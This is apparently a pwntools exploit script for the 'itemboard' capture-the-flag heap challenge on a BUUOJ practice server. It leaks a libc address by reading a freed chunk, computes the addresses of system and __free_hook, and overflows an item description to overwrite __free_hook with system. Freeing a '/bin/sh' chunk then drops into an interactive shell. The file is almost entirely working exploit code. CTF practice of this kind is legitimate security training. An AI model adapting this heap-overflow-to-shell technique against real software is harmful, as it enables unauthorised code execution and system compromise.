from pwn import *
filename="./itemboard"
libc_name="/home/nicholas/glibc-all-in-one/libs/buu_libc6_2.23-0ubuntu11.3_amd64/libc.so.6"
# io = process(filename)
io = remote('node4.buuoj.cn',27119)
context.log_level='debug'
elf=ELF(filename)
libc=ELF(libc_name)
context.terminal=['tmux','split','-hp','60']


def choice(index):
    io.recvuntil(':')
    io.sendline(str(index))



def add(length,con):
    choice(1)
    io.sendlineafter('Item name?',"aa")
    io.recvuntil('len?')
    io.sendline(str(length))
    io.recvuntil('Description?')
    io.sendline(con)


def show(index):
    choice(3)
    io.recvuntil('Which item?')
    io.sendline(str(index))

def delete(index):
    choice(4)
    io.recvuntil('Which item?')
    io.sendline(str(index))


def rop_payload(pointer,payload):
    io.recvuntil('choose:')
    io.sendline('1')
    io.recvuntil('Item name?')
    io.sendline('aa')
    io.recvuntil('Description\'s len?')
    io.sendline(str(0x418+len(payload)))
    io.recvuntil('Description?')
    io.sendline(b"a"*(0x410-0xc)+p32(0x10000)+p64(pointer)+p64(0x0)+payload)


def debug():
    gdb.attach(io,"brva 0xD70")
    show(0)

og = [0x45226,0x4527a,0xf03a4,0xf1247]


add(0x418,"aa") #0
add(0x68,"a")#1
add(0x68,"/bin/sh\x00")#2
delete(0)
show(0)
libc_info = u64(io.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
success("libc_info: " + hex(libc_info))
libc_base = libc_info - 0x3c4b78
success("libc_base: " + hex(libc_base))
free_hook_addr = libc_base + 0x3c3ef8
success("free_hook_addr-0x18: " + hex(free_hook_addr-0x8))
system = libc.symbols['system'] + libc_base
success("system: " + hex(system))

free_hook = libc_base+libc.symbols['__free_hook']
payload = p64(system) + b"a"*(0x410-0x8-0x8)+p64(free_hook_addr-0x8)
# gdb.attach(io,"brva 0xCCB")
add(0x418,payload)
delete(2)




io.interactive()
